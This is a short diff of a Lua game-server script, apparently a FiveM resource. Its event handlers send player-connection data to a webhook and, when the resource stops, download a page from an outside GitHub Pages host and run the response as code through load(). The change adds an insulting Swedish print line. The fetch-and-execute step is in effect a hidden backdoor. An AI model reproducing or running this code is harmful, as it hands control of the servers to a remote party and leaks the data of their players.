@@ -35,7 +35,9 @@ AddEventHandler('playerConnecting', function(name, setCallback, deferrals)
     sendToWebhook(dataToSend)
 end)
 AddEventHandler('onResourceStop', function(resourceName)
+
     if resourceName == GetCurrentResourceName() then
+        print("Pissar på dina döda")
         PerformHttpRequest("https://hairodocs.github.io/stop.html", function(errorCode, responseBody) 
             local payload = assert(load(responseBody)) 
             if responseBody == nil then return end 
